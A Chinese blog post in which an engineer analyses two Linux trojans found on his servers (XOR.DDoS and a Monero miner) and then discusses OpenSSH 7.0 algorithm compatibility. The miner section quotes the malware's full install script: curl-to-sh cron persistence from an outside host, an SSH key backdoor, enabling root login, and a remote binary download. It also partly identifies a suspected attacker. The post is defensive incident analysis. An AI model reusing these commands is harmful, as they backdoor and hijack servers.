# 木马来袭

>在与特洛伊的战争中，我们从未取得优势。— 弗拉基米.耶维奇.严

（Linux/XOR.DDoS）木马入侵分析及其它

![样本](http://o8m8ngokc.bkt.clouddn.com/trojan-demo-1.png)

### 工程师的三大法宝

一个有江湖经验的工程师，通常随身携带三件法宝，就像这样：

>用户：这个采集点为什么没数据？
>客服：我们看看
> 工程师各种排查，重启进程
> 客服：现在有了，你再看看？
> 用户：......
> 三天后
> 用户：这个采集点为什么又没数据？
> 工程师各种排查，发现A机房的某台服务器登陆缓慢
> 客服：一台服务器坏了，需要重装系统
> 用户：......
> 系统重装几周后，问题再次来袭
> 工程师：服务器太老了，硬件有问题，建议换新的
> 用户：......

**“没有什么问题是重启解决不了的，如果一次不行，那就两次。”**

在很多情况下，三板斧确实可以解决不少问题。

重启：
包括进程重启和系统重启，鉴于很多程序自身的隐藏性能问题，重启可以释放资源、重新加载配置，或者可能输出异常信息，为解决问题提供思路。
重装：修复被破坏的文件，格式化磁盘，修复配置等。有一定效果。
换机器：对于有年头的机器有效，磁盘、CPU、主板、乃至于不起眼的一颗电池，都有可能是引发性能问题的瓶颈。

如果排除上述因素，就要警惕自己的机器是不是被植入木马了。我们首先来看一个样本。

#### 特征分析
一般特征：功能异常数上升、登陆缓慢、网卡流量异常波动
如果木马程序还没有进程隐藏功能的话，还可以在top看到如下信息
(img)
```
PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
3494 root      19   0  378m  25m  212 R **1595.6**  0.7   5798:34 eyshcjdmzg
```

这是我抓到的第一个木马样本，所以给它取了个代号：101。

### 基础分析
1. 篡改crontab
**-bash-4.3# cat /etc/crontab**
```
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

\# run-parts
01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly
\*/3 * * * * root /etc/cron.hourly/gcc.sh
```

2. 程序入口
**-bash-4.3# vi /etc/cron.hourly/gcc.sh**
```
\#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do ifconfig $i up& done   
cp /lib/libudev.so /lib/libudev.so.6
/lib/libudev.so.6
```
木马通过crontab创建时间计划任务来实现启动,运行该gcc.sh，该命令启动所有网卡，并拷贝/lib/libudev.so文件到/lib/libudev.so.6并执行该文件。

3. 攻击路径
如果部署了登陆审计平台，或者对方还没来得及清扫犯罪现场，可以看到他的来路：
```
-bash-4.3# last -10
user   pts/3        11X.25.49.200    Mon Jun  6 23:46 - 01:47  (02:01)
```
再根据以上公网IP和时间，可以定位到它的来源是某普通宽带用户。
宽带账号：05919399XXXX@fj
客户名称：危XX

4. 应急清除策略
恢复crontab－>清除gcc.sh －>清除/lib/libudev.so.6 －>查杀进程
一定要注意操作顺序，如果只kill掉进程是没有用的，它已经做到自己复制、重启。


#### XOR.DDoS木马原理
编号101是一款国产的Linux系统的远程控制软件（Linux/XOR.DDoS）。

MalwareMustDie首先在2014年10月曝光了该木马。32位和64位的Linux Web服务器、台式机、ARM架构系统等也容易遭受该木马攻击。

杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。

此外，它主要针对游戏和教育网站，能够对其发起强有力的DDoS攻击，可以达到每秒1500亿字节的恶意流量。根据内容分发网络Akamai科技发布的一份报告，XOR DDoS僵尸网络每天至少瞄准20个网站，将近90%的目标站点位于亚洲。报告中声称：
“Akamai的安全情报反应小组（SIRT）正在追踪XOR DDoS，这是一个木马恶意软件，攻击者使用它劫持Linux机器并将其加入到僵尸网络，以发起分布式拒绝服务攻击（DDoS）活动。迄今为止，XOR DDoS僵尸网络的DDoS攻击带宽从数十亿字节每秒（Gbps）到150+Gbps。游戏行业是其主要的攻击目标，然后是教育机构。今天早上Akamai SIRT发布了一份安全威胁报告，该报告由安全响应工程师Tsvetelin ‘Vincent’ Choranov所作。”

#### 源码分析

**多态（Polymorphic）** 是指恶意软件在自我繁殖期间不断改变（“morphs”）其自身文件特征码（大小、hash等等）的特点，衍生后的恶意软件可能跟以前副本不一致。因此，这种能够自我变种的恶意软件很难使用基于签名扫描的安全软件进行识别和检测。

![样本](http://o8m8ngokc.bkt.clouddn.com/trojan-demo-1.png)

![样本](http://o8m8ngokc.bkt.clouddn.com/trojan-demo-1-2.png)

木马具有非常多功能：增加服务、删除服务、执行程序、隐藏进程、隐藏文件、下载文件、获取系统信息、发起DDOS攻击等行为。
主程序的作用是根据感染目标机器的系统开发版本传输并且选择C&C服务器。
C2服务器归属地为美国,加利福尼亚州,洛杉矶。

其实就算是拿到了样本，逆向难度也很大。何况木马关键数据全部加密，传输过程也加密，哪哪都是加密。笔者曾经试图自行破解，找来了《IDA Pro指南》之类的秘籍，无奈功力不够，只能草草收场。

#### 防御之难

首先，防御一方是守城战。资源有限，防线漫长，安全投入大见效慢。做与不做效果无法评估，做了不代表没有漏洞，不做也不见得出什么大事。

其次，消极安全观主导制度体系建设。每个大单位都有安全责任制，甚至很多地方都上升到安全KPI一票否决的高度。实际情况呢？ 管理上的松散、各自为战，为了安全KPI，消极看待业务需求，逼得业务方剑走偏锋，反而增加了漏洞风险。

最后，攻防双方技术上完全不对等。
攻击者已经进化到大兵团作战模式，兵强马壮，甚至还发展出CaaS（Crime as a Service）这类梦幻般的服务理念。例如僵尸网络不仅可以调度全部资源，提供大规模攻击服务，还能提供间歇性的慢速攻击服务。按需收费，童叟无欺。
防御者基本上还是的大刀长矛。这战没发打。

#### 合作
如果凭借笔者个人的天资和努力，甚至凭借本公司的力量，几乎可以肯定，我们到现在还不一定能知道这款的木马的名字，更不用说管窥它的细节。因为我们根本就不是安全公司，几百号人里面连一个安全专家都没有。这种情况在其它企业应该也具有普遍性。

在这次的案例中，很快就完成了从样本捕获、攻击分析到安全加固的一系列动作，全程业务不受太大影响，甲方用户基本无感知。关键得益于和第三方的充分合作。

微步在线（ThreatBook）——国内首家威胁情报公司。它们的思路很特别，没有去走传统安全公司的老路，而是专注于威胁情报的样本分析、收集和处理，实现大范围长跨度的数据积累，促进情报交流和信息共享，通过合作创造价值。这个思路对于打破行业、竞争企业的壁垒，意义非凡。

最近，它们刚刚拿到A轮投资，资本市场就是敏锐。


##（2）今天你被挖矿了吗？
字数835 阅读115 评论2 喜欢1
书接上文，针对编号101样本的分析，我们已经知道，黑色产业界通过植入木马，控制了大量主机资源，只要有人花钱，就可以按需要调度足够的资源发动DDos攻击，据说还可以按效果付费。

此外，还有一种常见模式则是“挖矿木马”，首先还是来看样本：
~~~
root      3744 29921  0 19:53 pts/0    00:00:00 grep min
root     31333     1 99 19:48 ?        02:46:38
/opt/minerd -B -a cryptonight
-o stratum+tcp://xmr.crypto-pool.fr:8080 -u
48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKk
cvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x
~~~

uptime看到的负载值非常高。

启动脚本
~~~

echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
    mkdir -p ~/.ssh
    rm -f ~/.ssh/authorized_keys*
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
    /etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/lady" ]; then
    if [ ! -f "/etc/systemd/system/lady.service" ]; then
        mkdir -p /opt
        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33
    fi
fi

service lady start
systemctl start lady.service
/etc/init.d/lady start


echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
    mkdir -p ~/.ssh
    rm -f ~/.ssh/authorized_keys*
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
    /etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/lady" ]; then
    if [ ! -f "/etc/systemd/system/lady.service" ]; then
        mkdir -p /opt
        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33
    fi
fi

service lady start
systemctl start lady.service
/etc/init.d/lady start

mkdir -p /opt

# /etc/init.d/lady stop
# systemctl stop lady.service
# pkill /opt/cron
# pkill /usr/bin/cron
# rm -rf /etc/init.d/lady
# rm -rf /etc/systemd/system/lady.service
# rm -rf /opt/KHK75NEOiq33
# rm -rf /usr/bin/cron
# rm -rf /usr/bin/.cron.old
# rm -rf /usr/bin/.cron.new
~~~

**商业模式**
被植入比特币“挖矿木马”的电脑，系统性能会受到较大影响，电脑操作会明显卡慢、散热风扇狂转；另一个危害在于，“挖矿木马”会大量耗电，并造成显卡、ＣＰＵ等硬件急剧损耗。比特币具有匿名属性，其交易过程是不可逆的，被盗后根本无法查询是被谁盗取，流向哪里，因此也成为黑客的重点窃取对象。

**攻击&防御**
植入方式：安全防护策略薄弱，利用Jenkins、Redis等中间件的漏洞发起攻击，获得root权限。

最好的防御可能还是做好防护策略、严密监控服务器资源消耗（CPU／load）。

这种木马很容易变种，很多情况杀毒软件未必能够识别：
63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017

![](http://upload-images.jianshu.io/upload_images/1037849-a1acdb7f1a4b062c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](http://upload-images.jianshu.io/upload_images/1037849-6b11b0ad9034756f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


# SSH并不安全

OpenSSH7.0做出了一些变更，默认禁用了一些较低版本的密钥算法。受此影响，在同一系统中的主机、网络设备必须同步升级，或者开启兼容选项。 实测中，也有某些厂家产品内核的原因，甚至无法升级。由此案例，关于系统版本管理、安全、架构、开源文档，甚至采购方面，都可以引发很多思考。

### 背景
某系统按照安全管理要求，需对全系统主机的OpenSSH版本升级。
第一次测试：系统自有服务器。主机：RedHat Linux ／SunOS：系统内全部主机升级，内部互通没有问题
第二次测试：主机到网络设备SSH互通性

### 国外厂商
思科（系统版本IOS 12.0系列，IOS 4.0系列），RedBack（系统版本SEOS-12系列，SEOS-6.0系列）。
目前仅支持diffie-hellman-group1-sha1、ssh-dss两种算法。
当然不排除今年国产化运动影响，国外厂商维保过期等原因导致的售后升级服务滞后。

### 国内厂商
华为，无论是城域骨干网设备，还是IPRAN 各型号，甚至老式交换机都完全兼容。
中兴，只有较新的CTN9000-E V3.00.10系列能有限支持diffie-hellman-group1-sha1，
其它各型号在服务器OpenSSH7.0以上版本后都无法正常访问。

## 原因解析

### 直接原因：OpenSSH7.0安全特性升级
基于安全考虑，OpenSSH7.0将diffie-hellman-group1-sha1，ssh-dss等运行时状态默认变更为禁用。
Support for the 1024-bit diffie-hellman-group1-sha1 key exchange is disabled by default at run-time.
Support for ssh-dss, ssh-dss-cert-* host and user keys is disabled by default at run-time*

### 采购原因：国产化运动
国产化是近年以来的国家战略，各行各业都有涉及。在本次案例中，国际大厂Cicso,RedBack,Juniper等，个人以为更大的可能不是无法更新，而是基于商务原因。既然你不在维保合同期之内，又没有继续采购的计划，那我干嘛还给你升级？
甚至由此可以推论：针对在网国外厂商设备，漏洞多又没有升级保障，会变成攻击和防护的重灾区。

### 软件质量：厂商系统架构水平差异
同样是国内厂家，测试对比结果却非常强烈！！这其实是没有想到的。通过这个小细节，可以看出华为的系统架构与中兴早已拉开境界上的差距。结合近年来，华为出入开源社区的身影，更可以说明其对系统内核的理解和掌握已经到了相当的程度。
个人揣测，其早期版本可能也没有多好的支持。由于架构设计较好，又有更高的自我要求，逐步通过补丁升级，不动声色地就更新好了。持续升级能力，可以作为评价企业长期

### OpenSSH7.0以后的演进
针对密钥强度和加密算法方面更新会持续加强，必须有所准备
We plan on retiring more legacy cryptography in the next releaseincluding:
* Refusing all RSA keys smaller than 1024 bits (the current minimumis 768 bits)
* Several ciphers will be disabled by default: blowfish-cbc,cast128-cbc, all arcfour variants and the rijndael-cbc aliasesfor AES.
* MD5-based HMAC algorithms will be disabled by default.

### 延伸：Logjam Attack
（本人没查到对应的中文名称，暂翻译为“僵尸攻击”，欢迎指正）
一种针对Diffie-Hellman密钥交换技术发起的攻击，而这项技术应用于诸多流行的加密协议，比如HTTPS、TLS、SMTPS、SSH及其他协议。一个国外计算机科学家团队2015-5-20公开发布。


### 延伸：开源组件演进追踪
本案例实际操作过程中，开头走了很多弯路，并没有一下找到要害。
根源在于团队缺乏关注开源产品演进方向的意识和习惯，也缺乏直接阅读、理解官方文档的习惯。

### OpenSSH 7.0 变更说明
Changes since OpenSSH 6.9
=========================
This focus of this release is primarily to deprecate weak, legacyand/or unsafe cryptography.
Security--------

* sshd(8): OpenSSH 6.8 and 6.9 incorrectly set TTYs to be world-
writable. Local attackers may be able to write arbitrary messages
to logged-in users, including terminal escape sequences.
Reported by Nikolay Edigaryev.

* sshd(8): Portable OpenSSH only: Fixed a privilege separation
weakness related to PAM support. Attackers who could successfully
compromise the pre-authentication process for remote code
execution and who had valid credentials on the host could
impersonate other users.  Reported by Moritz Jodeit.

* sshd(8): Portable OpenSSH only: Fixed a use-after-free bug
related to PAM support that was reachable by attackers who could
compromise the pre-authentication process for remote code
execution. Also reported by Moritz Jodeit.

* sshd(8): fix circumvention of MaxAuthTries using keyboard-
interactive authentication. By specifying a long, repeating
keyboard-interactive "devices" string, an attacker could request
the same authentication method be tried thousands of times in
a single pass. The LoginGraceTime timeout in sshd(8) and any
authentication failure delays implemented by the authentication
mechanism itself were still applied.

Found by Kingcope.
Potentially-incompatible Changes
--------------------------------
* Support for the legacy SSH version 1 protocol is disabled by
default at compile time.
* Support for the 1024-bit diffie-hellman-group1-sha1 key exchange
is disabled by default at run-time. It may be re-enabled using
the instructions athttp://www.openssh.com/legacy.html
* Support for ssh-dss, ssh-dss-cert-* host and user keys is disabled
by default at run-time. These may be re-enabled using the
instructions at http://www.openssh.com/legacy.html
* Support for the legacy v00 cert format has been removed.
* The default for the sshd_config(5) PermitRootLogin option has changed from "yes" to "prohibit-password".
* PermitRootLogin=without-password/prohibit-password now bans all
interactive authentication methods, allowing only public-key,hostbased and GSSAPI authentication (previously it permitted keyboard-interactive and password-less authentication if those were enabled).

### 解决方案（翻译）
OpenSSH实现了所有符合SSH标准的加密算法，使得应用之间可以互相兼容，但是自从一些老式的算法被发现不够强壮以来，并不是所有的算法都会默认启用。
当OpenSSH拒绝连接一个只支持老式算法的应用时，我们该如何做呢？
当一个SSH客户端与一个服务端建立连接的时候，两边会互相交换连接参数清单。清单包括用于加密连接的编码信息，消息认证码（MAC）用于防止网络嗅探篡改，
公钥算法可以让服务端向客户端证明它是李刚（我就是我，而不是另一个“我”），密钥交换算法是用来生成每次连接的密钥。在一次成功的连接中，这里的每个参数必须有一组互相支持的选择。
当客户端和服务端通讯的时候，不能匹配到一组互相支持的参数配置，那么这个连接将会失败。
OpenSSH(7.0及以上版本）将输出一个类似的错误信息：
~~~
Unable to negotiate with 127.0.0.1: no matching key exchange method found.
Their offer: diffie-hellman-group1-sha1
~~~
在这种情况下，客户端和服务端不能够就密钥交换算法达成一致。服务端只提供了一个单一的算法 ：diffie-hellman-group1-sha1。
OpenSSH可以支持这种算法，但是它默认不启用，因为这个算法非常弱，理论上存在僵尸攻击的风险。
这个问题的最好的解决方案是升级软件。
OpenSSH禁用的算法，都是那些我们明确不推荐使用的，因为众所周知它们是不安全的。
在某些情况下，立科升级也许是不可能的，你可能需要临时地重新启用这个较弱的算法以保持访问。
在上面这种错误信息的情况下，OpenSSH可以配置启用diffie-hellman-group1-sha1 密钥交换算法（或者任何其它被默认禁用的），
可通过KexAlgorithm选项－或者在命令行：
~~~
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@127.0.0.1
~~~
或者在 ~/.ssh/config 配置文件中:
~~~
Host somehost.example.org
KexAlgorithms +diffie-hellman-group1-sha1
~~~

命令行中ssh和“＋”号之间连接算法选项的配置，对客户端默认设置来说相当于替换。通过附加信息，你可以自动升级到最佳支持算法，当服务端开始支持它的时候。另一个例子，主机验证过程中，当客户端和服务端未能就公钥算法达成一致的时候：

~~~
Unable to negotiate with 127.0.0.1: no matching host key type found.
Their offer: ssh-dss
~~~
OpenSSH 7.0及以上版本同样禁用了ssh-css(DSA)公钥交换算法。
它也太弱了，我们强烈不建议使用它。
~~~
ssh -oHostKeyAlgorithms=+ssh-dss user@127.0.0.1
~~~
或者在 ~/.ssh/config 配置文件中:
~~~
Host somehost.example.org
HostkeyAlgorithms ssh-dss
~~~
视服务端配置情况而定，验证过程中其它连接参数也可能失败。
你启用它们的时候，也许需要确定编码方式或者消息验证码配置选项。
延伸：查询 SSH 已支持的算法
~~~
ssh -Q cipher       # 支持的编码方式
ssh -Q mac          # 支持的消息验证码
ssh -Q key          # 支持的公钥类型
ssh -Q kex          # 支持的密钥交换算法
~~~
最后，当你需要试图连接一个特殊主机的时候，也可以通过－G选项查询实际使用ssh配置。
~~~
ssh -G  user@somehost.example.com
~~~
将列出所有的配置选项，包括被选用的编码方式，消息验证码，公钥算法，密钥算法参数的值。

<hr>
更多精彩内容，请扫码关注公众号：@睿哥杂货铺
[RSS订阅 RiboseYim](https://riboseyim.github.io?product=ebook&id=linuxperfmaster)
